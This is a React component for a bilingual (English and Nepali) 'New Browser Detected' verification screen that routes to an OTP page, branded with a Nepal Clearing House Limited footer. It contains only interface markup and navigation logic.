import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';

function Verify() {
  const [language, setLanguage] = useState('EN'); // For language toggle
  const navigate = useNavigate(); // Initialize navigate function

  const toggleLanguage = (lang) => setLanguage(lang);

  const handleContinue = () => {
    navigate('/otp'); // Navigate to OTP page
  };

  return (
    <div className="login-page">
      <div className="login-container">
        {/* Logo Section */}
        <div className="login-logo">
          <img src="logo.png" alt="Logo" className="logo-image" />

          {/* Language Toggle Capsule */}
          <div className="language-toggle-capsule">
            <button
              className={`language-option ${language === 'EN' ? 'active' : ''}`}
              onClick={() => toggleLanguage('EN')}
            >
              EN
            </button>
            <button
              className={`language-option ${language === 'ने' ? 'active' : ''}`}
              onClick={() => toggleLanguage('ने')}
            >
              ने
            </button>
          </div>
        </div>

        {/* Verify Section */}
        <br />
        <div className="verify-section">
          <h5 className="text-primary font-weight-bold mb-3">
            {language === 'EN'
              ? "New Browser Detected. Please verify it's you."
              : 'नयाँ ब्राउजर पत्ता लाग्यो। कृपया यो तपाईं हो भनेर प्रमाणित गर्नुहोस्।'}
          </h5>
          <br />
          <p className="text-left mb-4">
            {language === 'EN' ? 'Do you want to continue?' : 'के तपाइँ जारी राख्न चाहनुहुन्छ?'}
          </p>
          <div className="d-flex mt-2 mb-4">
            <button className="btn btn-outline-primary flex-grow-1 mr-2" type="button">
              {language === 'EN' ? 'Cancel' : 'रद्द गर्नुहोस्'}
            </button>
            <button
              className="btn btn-primary flex-grow-1 ml-2"
              type="button"
              onClick={handleContinue} // Navigate to OTP
            >
              {language === 'EN' ? 'Continue' : 'जारी राख्नुहोस्'}
            </button>
          </div>
        </div>
        <br />
        <br />
        <br />
        <br />

        {/* Footer Section */}
        <footer>
          <img src="footer.png" alt="Powered by NPS" className="powered-by-logo" />
          <p>version: 1.11.5</p>
          <p>Copyright © Nepal Clearing House Limited, 2018-2024</p>
        </footer>
      </div>
    </div>
  );
}

export default Verify;
